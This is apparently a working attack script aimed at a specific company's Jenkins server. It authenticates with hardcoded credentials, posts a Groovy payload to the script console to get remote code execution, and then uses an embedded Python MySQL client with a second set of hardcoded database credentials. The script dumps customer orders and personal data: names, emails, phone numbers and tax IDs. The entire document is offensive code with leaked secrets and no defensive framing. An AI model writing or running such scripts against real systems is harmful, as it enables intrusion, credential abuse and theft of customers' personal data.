import requests
import urllib3
urllib3.disable_warnings()

JENKINS = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

sess = requests.Session()
sess.auth = (USER, PASS)
sess.verify = False

# Get crumb
crumb_url = f"{JENKINS}/crumbIssuer/api/json"
r = sess.get(crumb_url, timeout=30)
r.raise_for_status()
crumb_data = r.json()
crumb_header = crumb_data["crumbRequestField"]
crumb_value = crumb_data["crumb"]
print(f"[+] Crumb: {crumb_header}={crumb_value}")

GROOVY = r'''
def r = ["bash","-c","""python -c "
import sys,socket,struct,hashlib
reload(sys);sys.setdefaultencoding('utf-8')
HOST='172.27.141.6';PORT=3308;USER='apifincadodev';PASS='1q2w3e4r5t6y'
s=socket.socket();s.settimeout(20);s.connect((HOST,PORT))
d=b''
while True:
 ch=s.recv(4096)
 if not ch:break
 d+=ch
 if len(d)>=4:
  pl=ord(d[0])+(ord(d[1])<<8)+(ord(d[2])<<16)
  if len(d)>=pl+4:break
i=5
while ord(d[i:i+1])!=0:i+=1
i+=1
tid=struct.unpack('<I',d[i:i+4])[0];i+=4
salt1=d[i:i+8];i+=9
caps=struct.unpack('<H',d[i:i+2])[0];i+=2
i+=1
status=struct.unpack('<H',d[i:i+2])[0];i+=2
caps2=struct.unpack('<H',d[i:i+2])[0];i+=2
i+=11
salt2=d[i:i+12]
salt=salt1+salt2
p1=hashlib.sha1(PASS).digest()
p2=hashlib.sha1(p1).digest()
p3=hashlib.sha1(salt+p2).digest()
xor=bytearray(20)
for j in range(20):xor[j]=ord(p1[j])^ord(p3[j])
capf=0x0003f7cf
pkt=struct.pack('<I',capf)+struct.pack('<I',1<<24)+chr(33)+chr(0)*23+USER+chr(0)+chr(20)+str(bytes(xor))+'tienda'+chr(0)
s.send(struct.pack('<I',len(pkt))[:3]+chr(1)+pkt)
r2=s.recv(4096)
if ord(r2[4])!=0:
 print('AUTH FAIL');sys.exit(1)
print('AUTH OK')
def q(sk,sql):
 d=sql.encode('utf-8')
 sk.send(struct.pack('<I',len(d)+1)[:3]+chr(0)+chr(3)+d)
 r=b''
 import time;time.sleep(0.5)
 while True:
  try:
   ch=sk.recv(65536)
   if not ch:break
   r+=ch
   if len(ch)<65536:break
  except:break
 return r
# Enumerate schema
print 'LATEST ORDERS + CLIENT PII:'
raw=q(s,'SELECT p.Id,p.Num_pedido,p.Fecha_Inicio,p.total,p.Estatus,p.ip,c.Nombre,c.Apellido_Paterno,c.Email,c.telefono,c.rfc FROM tienda.pedidos p JOIN tienda.clientes c ON p.Cliente=c.Id ORDER BY p.Id DESC LIMIT 20')
print repr(raw[:6000])
# Count current month
print '\\\\nCOUNT AUG 2026:'
raw2=q(s,'SELECT COUNT(*) FROM tienda.pedidos WHERE Fecha_Inicio >= \"2026-08-01\"')
print repr(raw2[:500])
# Total clients
print '\\\\nTOTAL CLIENTS:'
raw3=q(s,'SELECT COUNT(*) FROM tienda.clientes')
print repr(raw3[:500])
# Recent clients with email
print '\\\\nRECENT CLIENTS PII (top 15):'
raw4=q(s,'SELECT c.Id,c.Nombre,c.Apellido_Paterno,c.Email,c.telefono,c.rfc,c.fecha_creacion FROM tienda.clientes c ORDER BY c.Id DESC LIMIT 15')
print repr(raw4[:5000])
s.close()
" 2>&1"""].execute().text
println r
'''

headers = {crumb_header: crumb_value}
r = sess.post(
    f"{JENKINS}/scriptText",
    data={"script": GROOVY},
    headers=headers,
    timeout=60
)

print(f"\n[+] Status: {r.status_code}")
print(f"[+] Response length: {len(r.text)}")
print("\n{'='*60}")
print("JENKINS OUTPUT:")
print("{'='*60}")
print(r.text)
